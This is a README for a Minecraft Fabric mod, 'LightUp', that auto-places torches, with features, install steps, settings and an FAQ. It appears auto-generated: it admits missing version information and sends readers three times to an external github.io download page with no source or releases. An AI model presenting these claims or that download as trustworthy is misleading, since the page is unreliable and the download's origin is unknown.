# LightUp - Minecraft Mod 2026

> **LightUp is a Fabric mod for Minecraft that places torches automatically in dark areas. Its grid-based system improves light distribution and helps reduce the risk of hostile mob spawns.**

[![Game Mod](https://img.shields.io/badge/Type-Game%20Mod-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Minecraft%20Fabric-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/logan-reedczn1272/lightup-minecraft-light-mod?style=flat-square)](https://github.com/logan-reedczn1272/lightup-minecraft-light-mod)

---

<p align="center">
  <a href="https://logan-reedczn1272.github.io/lightup-minecraft-light-mod/">
    <img src="https://img.shields.io/badge/Download-LightUp%20Mod-brightgreen?style=for-the-badge" alt="Download LightUp Mod">
  </a>
</p>

> **[Download LightUp](https://logan-reedczn1272.github.io/lightup-minecraft-light-mod/)**

---

[Download Latest Build](https://logan-reedczn1272.github.io/lightup-minecraft-light-mod/)

---

## What LightUp Does

Lighting a large Minecraft area by hand can take a considerable amount of time. LightUp automates that work for Fabric worlds by checking nearby dark spaces and positioning torches on a consistent grid, creating more even coverage without requiring every torch to be placed manually.

The mod can calculate the expected torch usage before it starts, including the equivalent number of stacks. You can choose a scan radius for either focused work or broader coverage, and ongoing progress information helps track longer operations.

---

## Highlights

- Finds dark areas and places torches automatically.
- Follows a grid with 12-block spacing between placement points.
- Provides a torch estimate before placement begins.
- Presents the estimate as both a total and stack breakdown.
- Works in Survival and OP modes.
- Offers scan radii from 8 through 128 blocks.
- Uses a placement pace intended to be server-friendly.
- Runs a follow-up cleanup scan for dark locations missed on the first pass.
- Shows progress during an active placement operation.
- Improves lighting coverage to help prevent mob spawning.

---

## Installation

1. Download the newest LightUp build using the link above.
2. Install Fabric Loader and the Fabric API version required for your Minecraft setup.
3. Copy the LightUp `.jar` into the Minecraft `mods` folder.
4. Launch the game through the Fabric profile.
5. Join a compatible world or server, then select the scan radius and operating mode.
6. Start a scan and inspect the torch preview before approving placement.

Make sure you have enough torches for the area being processed. Survival mode requires the player to provide the torches used by the mod.

---

## Configuration

| Setting | Available values | Purpose |
|---|---:|---|
| Scan radius | 8-128 blocks | Determines the distance LightUp searches for dark locations. |
| Placement pattern | Every 12 blocks | Defines the spacing of the automated grid. |
| Operating mode | Survival / OP | Chooses the supported gameplay mode used for scanning. |
| Torch preview | On / Off | Displays the estimated torch total and stack breakdown before placement. |
| Cleanup scan | On / Off | Enables a second search for dark areas not found during the first scan. |
| Placement rate | Server-friendly | Sets the pacing used for multiplayer-oriented placement. |
| Progress updates | On / Off | Shows status information while an operation is underway. |

The exact configuration labels and ways to access them can differ between builds.

---

## Compatibility and Requirements

- **Game:** Minecraft
- **Mod platform:** Fabric
- **Modes:** Survival and OP
- **Supported radius:** 8 to 128 blocks
- **Placement spacing:** 12-block grid
- **Multiplayer focus:** Includes a server-friendly placement rate

The available project information does not identify specific Minecraft or Fabric Loader versions. Review the release notes and build metadata before installing. Performance and results can depend on terrain, torch inventory, server permissions, and the chosen radius.

---

## 2026 Changelog

- Centers LightUp's functionality on automated torch placement using grid-based scans.
- Adds a pre-placement torch preview with stack calculations.
- Provides adjustable scan coverage, progress reporting, and cleanup checks.
- Supports Survival and OP workflows with server-friendly placement timing.

---

## Frequently Asked Questions

### What is the installation process?

Download a LightUp build, move the `.jar` file into the Fabric `mods` directory, and start Minecraft using the matching Fabric profile.

### What radius should I use?

Choose a value from 8 to 128 blocks. A smaller radius is better suited to a nearby area, while a larger setting allows one operation to inspect more terrain.

### Can LightUp estimate torch usage?

Yes. Before placement begins, the preview reports the expected number of torches and breaks that amount down into stacks.

### Which behaviors can be adjusted?

You can configure the scan radius, operating mode, cleanup scan, torch preview, progress updates, and placement pacing. The grid itself remains set to 12-block spacing.

### Is Survival mode supported?

Yes. LightUp supports Survival as well as OP mode. Players using Survival must have enough torches in their inventory for the requested placement.

### What happens during a cleanup scan?

LightUp performs another dark-area check to locate spots that the initial placement pass may have overlooked.

### What Minecraft versions can I use?

The extracted project information does not list exact Minecraft or Fabric versions. Consult the version details supplied with the relevant LightUp release.

### Where does the mod file go?

Place the downloaded LightUp `.jar` in the `mods` directory belonging to the Fabric installation used to launch Minecraft.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
